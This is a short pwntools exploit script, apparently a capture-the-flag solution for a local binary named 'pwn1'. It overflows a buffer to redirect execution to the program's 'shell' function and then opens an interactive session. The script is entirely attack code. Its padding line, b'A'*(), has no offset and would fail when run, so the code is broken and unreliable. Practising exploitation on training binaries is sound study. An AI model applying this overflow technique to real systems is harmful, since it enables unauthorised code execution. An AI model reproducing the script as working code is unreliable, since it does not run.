from pwn import *

elf = ELF('./pwn1')

target_address = elf.symbols['shell']
print('target address:\t', hex(target_address))

with process('./pwn1') as p:
	print(p.recv().decode())
	payload = b'A'*()
	payload += p32(target_address)
	p.send(payload)
	
	p.interactive()
